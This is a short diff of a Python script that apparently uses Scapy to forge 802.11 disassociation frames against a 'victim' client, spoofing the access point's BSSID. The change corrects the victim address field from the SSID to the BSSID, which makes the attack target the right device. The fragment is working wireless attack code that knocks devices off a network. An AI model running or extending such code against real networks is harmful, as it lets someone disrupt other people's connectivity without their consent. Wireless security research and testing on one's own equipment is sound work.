@@ -29,7 +29,7 @@ def set_injector_adapter(interface_name, channel):
             sys.exit(1)
 
 def send_disas_packets(interface_name, victim, ap, stop_injection):
-    victim_addr = victim['ssid']
+    victim_addr = victim['bssid']
     bssid = ap['bssid']
     dot11_layer = Dot11(addr1=victim_addr, addr2=bssid, addr3=bssid, FCfield=2)
     disas_layer = Dot11Disas(reason=7)
